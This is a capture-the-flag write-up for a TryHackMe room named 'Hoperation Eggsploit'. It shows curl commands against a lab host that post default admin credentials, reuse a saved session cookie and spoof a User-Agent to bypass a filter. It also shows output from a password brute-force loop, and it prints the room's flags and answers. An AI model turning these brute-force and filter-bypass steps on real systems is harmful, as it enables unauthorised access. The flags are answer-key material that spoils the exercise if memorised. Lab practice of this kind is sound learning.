# Exploitation with cURL - Hoperation Eggsploit

## Make a POST request to the /post.php endpoint with the username admin and the password admin. What is the flag you receive?
```
┌──(shaggy㉿kali)-[~]
└─$ curl -X POST -d "username=admin&password=admin" http://10.48.151.44/post.php
Login successful!
Flag: THM{curl_post_success}
```
```
THM{curl_post_success}
```
## Make a request to the /cookie.php endpoint with the username admin and the password admin and save the cookie. Reuse that saved cookie at the same endpoint. What is the flag your receive?
```
curl -c cookies.txt -d “username=admin&password=admin” http://10.48.151.44/cookie.php
```
```
curl -b cookies.txt http://10.48.151.44/cookie.php
```
```
THM{session_cookie_master}
```
## After doing the brute force on the /bruteforce.php endpoint, what is the password of the admin user?

```
┌──(shaggy㉿kali)-[~]
└─$ nano passwords.txt    
                                                                                                                                        
┌──(shaggy㉿kali)-[~]
└─$ nano loop.sh      
                                                                                                                                                                                                                                                                          
┌──(shaggy㉿kali)-[~]
└─$ chmod +x loop.sh                                      
                                                                                                                                        
┌──(shaggy㉿kali)-[~]
└─$ ./loop.sh   
Trying password: admin123
Trying password: password
Trying password: letmein
Trying password: secretpass
[+] Password found: secretpass

┌──(shaggy㉿kali)-[~]
└─$ 
                                   
```
## Make a request to the /agent.php endpoint with the user-agent TBFC. What is the flag your receive?

```
curl -A "TBFC" http://10.48.151.44/agent.php
```
```
THM{user_agent_filter_bypassed}
```
